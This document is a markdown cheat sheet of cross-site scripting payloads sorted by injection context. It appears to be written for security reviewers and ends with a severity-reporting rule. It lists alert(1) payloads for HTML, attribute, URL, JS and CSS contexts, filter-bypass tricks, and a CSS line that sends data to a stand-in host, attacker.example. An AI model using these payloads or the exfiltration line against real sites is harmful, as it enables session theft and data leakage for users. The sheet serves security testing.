# XSS payloads by context

Use the payload for the **exact context** the data lands in. The same string
that fires in an HTML body is inert inside a URL attribute, and vice versa.

## HTML body context

Data inserted as element content (e.g. `innerHTML`, `v-html`, message list):

```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

Inside an existing `<textarea>` block:

```
</textarea><img src=x onerror=alert(1)>
```

Inside an existing `<title>` or `<style>` block:

```
</title><img src=x onerror=alert(1)>
</style><img src=x onerror=alert(1)>
```

## HTML attribute context

Data interpolated into an attribute value (e.g. `value="${x}"`):

```
" onfocus=alert(1) autofocus x="
" onmouseover=alert(1) "
' onfocus=alert(1) '
```

If the attribute is `href` / `src` / `action` / `formaction` (URL context):

```
javascript:alert(1)
javascript:alert(1)//
data:text/html,<script>alert(1)</script>
```

## JS string context

Data interpolated into a script (e.g. `` `var x = '${x}';` ``):

```
';alert(1)//
</script><script>alert(1)</script>
```

## Template-literal context

```
${alert(1)}
`-alert(1)-`
```

## CSS / style context

`style` attribute injection, and exfiltration via CSS (works even where the
payload can't execute JS):

```
</style><img src=x onerror=alert(1)>
background:url(javascript:alert(1))
background:url(https://attacker.example/leak?data=)
```

## Encoding gotchas to check in the app

- Does the app HTML-escape but not JS-escape (or vice versa)? `&` becomes
  `&amp;` in one context and breaks out of the other. Verify the escaping
  function against the sink, not its name.
- `onerror` attribute needs the attribute context to be *unquoted* or
  breakable — check whether quotes are stripped first.
- Browser parsing quirks: `"><svg onload=...>` covers quote+tag cases;
  `<svg/onload=...>` covers whitespace-stripping filters; null bytes and
  control chars get dropped by some parsers, which can *re-enable* a payload
  a naive filter blocked.

## Reporting rule

A finding is CRITICAL only with a concrete context match. If the data can't
reach this context, it's WARNING/INFO with the reason stated.
